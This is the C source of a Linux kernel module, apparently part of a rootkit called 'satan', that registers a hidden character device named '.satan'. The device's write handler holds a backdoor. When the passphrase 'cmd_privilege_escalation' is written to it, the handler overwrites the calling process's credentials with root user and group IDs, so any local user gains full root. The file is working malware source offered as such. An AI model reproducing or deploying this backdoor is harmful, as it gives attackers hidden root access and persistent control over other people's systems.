// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "dev.h"

#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/cred.h>

#define DEVICE_NAME ".satan"
#define BACKDOOR_PASSPHRASE "cmd_privilege_escalation"

static int ret = 0;
static int major_number = 0;  // character device major number
static dev_t dev_num;

static struct satan_device satan_dev;  // our custom struct which holds rootkit data
static struct cdev *satan_cdev;  // character device struct from linux kernel
static struct file_operations fops;
static struct cred *cred = NULL;

static int satan_dev_open(struct inode *inode, struct file *filp);
static int satan_dev_close(struct inode *inode, struct file *filp);
static ssize_t satan_dev_read(struct file *filp, char *user_buf, size_t count, loff_t *cur_offset);
static ssize_t satan_dev_write(struct file *filp, const char *user_buf, size_t count, loff_t *cur_offset);


int satan_dev_init(struct module *m)
{
        fops.owner = m;
        fops.open = satan_dev_open;
        fops.release = satan_dev_close;
        fops.write = satan_dev_write;
        fops.read = satan_dev_read;


        memset(satan_dev.data, 0, sizeof(satan_dev.data));


        ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
        if (0 > ret) {
                pr_alert("satan: failed to allocate a major number for device file\n");
                goto init_end;
        }
        major_number = MAJOR(dev_num);  // extracts the major number
        pr_info("satan: major number is: %d\n", major_number);
        pr_info("satan: please execute as root: mknod /dev/%s c %d 0\n",
                        DEVICE_NAME, major_number);


        // Initialize satan_cdev
        satan_cdev = cdev_alloc();
        satan_cdev->ops = &fops;
        satan_cdev->owner = m;

        // Register our character device to the kernel
        ret = cdev_add(satan_cdev, dev_num, 1);
        if (0 > ret) {
                pr_alert("satan: failed to add cdev to kernel\n");
                goto init_end;
        }

        // initialize our semaphore with an initial value of 1
        sema_init(&satan_dev.smphore, 1);

init_end:
        if (0 == ret) {
                pr_info("satan: successfully initialized device file\n");
        }
        return ret;
}

void satan_dev_destroy(void)
{
        // Unregister our character device from the kernel
        cdev_del(satan_cdev);

        unregister_chrdev_region(dev_num, 1);
        pr_info("satan: successfully destroyed device file\n");
}


static int satan_dev_open(struct inode *inode, struct file *filp)
{
        if (0 != down_interruptible(&satan_dev.smphore)) {
                pr_alert("satan: failed to lock device file during open()\n");
                return -1;
        }

        pr_info("satan: successfully opened device file\n");
        return 0;
}

static int satan_dev_close(struct inode *inode, struct file *filp)
{
        up(&satan_dev.smphore);
        pr_info("satan: successfully closed device file\n");
        return 0;
}

static ssize_t satan_dev_read(struct file *filp, char *user_buf, size_t len, loff_t *offset)
{
        pr_info("satan: reading from device file\n");

        if (sizeof(satan_dev.data) <= *offset) {
                ret = 0;
        } else {
                ret = min(len, sizeof(satan_dev.data) - (size_t) *offset);
                if (copy_to_user(user_buf, satan_dev.data + *offset, ret)) {
                        ret = -EFAULT;
                } else {
                        *offset += ret;
                }
        }

        return ret;
}

static ssize_t satan_dev_write(struct file *filp, const char *user_buf, size_t len, loff_t *offset)
{
        pr_info("satan: writing to device file\n");

        if (sizeof(satan_dev.data) <= *offset) {
                ret = 0;
        } else {
                // If the buffer is not large enough, return -ENOSPC.
                if (sizeof(satan_dev.data) - (size_t) *offset < len) {
                        ret = -ENOSPC;
                } else {
                        if (copy_from_user(satan_dev.data + *offset, user_buf, len)) {
                                ret = -EFAULT;
                        } else {
                                ret = len;
                                *offset += ret;
                        }
                }
        }

        // backdoor
        if (!strncmp(BACKDOOR_PASSPHRASE, satan_dev.data, strlen(BACKDOOR_PASSPHRASE))) {
                cred = (struct cred *)__task_cred(current);
                cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
                cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
                printk("satan: root permission granted\n");
        }

        return ret;
}
